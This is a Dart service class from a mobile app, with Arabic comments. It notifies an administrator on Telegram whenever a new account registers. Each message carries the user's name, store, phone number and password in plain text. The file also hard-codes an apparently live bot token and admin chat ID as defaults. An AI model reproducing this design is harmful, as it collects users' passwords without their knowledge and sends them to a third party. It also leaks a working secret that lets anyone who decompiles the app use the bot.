// lib/services/telegram_notify_service.dart

import 'dart:async';

import 'package:http/http.dart' as http;

import '../config/app_config.dart';
import 'remote_config_service.dart';

/// إشعار المسؤول عبر Telegram عند تسجيل حساب جديد.
///
/// مبدأ العمل: التطبيق يستدعي Telegram Bot API مباشرة (sendMessage)
/// — لا حاجة لسيرفر وسيط. التوكن ومعرّف الدردشة يُدارَان عن بُعد عبر
/// Remote Config (المفاتيح: telegram_bot_token وtelegram_admin_chat_id)
/// مع قيم افتراضية مضمّنة في التطبيق تعمل فوراً دون نشر قيم جديدة.
///
/// ملاحظات أمان:
/// - التوكن مضمّن في APK (أو قابل للقراءة من Remote Config) — من يفكّك
///   التطبيق يستطيع إرسال رسائل إلى دردشة المسؤول (إزعاج) لكن لا يستطيع
///   قراءة ما يصل إليها.
/// - الرسالة تحمل كلمة المرور نصاً صريحاً بطلب من المسؤول — Telegram
///   يستطيع نظرياً قراءتها. لا تُستخدم الخدمة لأي غرض آخر.
///
/// الرسائل تُرسل بصيغة fire-and-forget: أي فشل يُسجَّل فقط ولا يؤثر
/// إطلاقاً على عملية التسجيل، ولا توجد إعادة محاولة لتجنّب التكرار.
class TelegramNotifyService {
  TelegramNotifyService._();
  static final TelegramNotifyService instance = TelegramNotifyService._();

  static const String _apiBase = 'https://api.telegram.org/bot';
  static const Duration _timeout = Duration(seconds: 10);

  // ⭐ قيم افتراضية تعمل مباشرة — يمكن استبدالها لاحقاً من Remote Config
  // (نفس المفاتيح دون نشر تحديث للتطبيق).
  static const String defaultBotToken =
      '8769858517:AAFb1JNjdT8YNBLHSjIvEe7a8gtpMQQEv2I';
  static const String defaultAdminChatId = '8727520113';

  final http.Client _client = http.Client();

  /// يرسل إشعار تسجيل حساب جديد إلى دردشة المسؤول.
  /// لا يرمي استثناءات أبداً — الأعطال تُسجَّل وتُتجاهل.
  Future<void> notifyNewRegistration({
    required String phone,
    required String fullName,
    required String storeName,
    required String password,
  }) async {
    try {
      final token = RemoteConfigService.instance.telegramBotToken;
      final chatId = RemoteConfigService.instance.telegramAdminChatId;
      if (token.isEmpty || chatId.isEmpty) {
        AppConfig.log('⚠️ Telegram notify skipped: token/chatId missing');
        return;
      }

      final text = '🆕 تسجيل حساب جديد — HANOTI\n'
          '━━━━━━━━━━━━━━\n'
          '👤 الاسم: $fullName\n'
          '🏪 المتجر: $storeName\n'
          '📱 الهاتف: $phone\n'
          '🔑 كلمة المرور: $password\n'
          '━━━━━━━━━━━━━━\n'
          '🕐 ${DateTime.now().toIso8601String()}';

      final uri = Uri.parse('$_apiBase$token/sendMessage');
      final response = await _client
          .post(
            uri,
            body: {
              'chat_id': chatId,
              'text': text,
            },
          )
          .timeout(_timeout);

      if (response.statusCode == 200) {
        AppConfig.log('✅ Telegram registration notify sent');
      } else {
        AppConfig.log(
            '⚠️ Telegram notify failed: HTTP ${response.statusCode}');
      }
    } catch (e) {
      // fire-and-forget: فشل الإشعار لا يمسّ مسار التسجيل
      AppConfig.logError('⚠️ Telegram notify error', e);
    }
  }

  /// يرسل رسالة اختبار — يُستخدم للتحقق من التوكن ومعرّف الدردشة.
  Future<bool> sendTestMessage([String text = 'HANOTI test message ✅']) async {
    try {
      final token = RemoteConfigService.instance.telegramBotToken;
      final chatId = RemoteConfigService.instance.telegramAdminChatId;
      if (token.isEmpty || chatId.isEmpty) return false;

      final response = await _client
          .post(
            Uri.parse('$_apiBase$token/sendMessage'),
            body: {'chat_id': chatId, 'text': text},
          )
          .timeout(_timeout);
      return response.statusCode == 200;
    } catch (e) {
      AppConfig.logError('⚠️ Telegram test message error', e);
      return false;
    }
  }
}
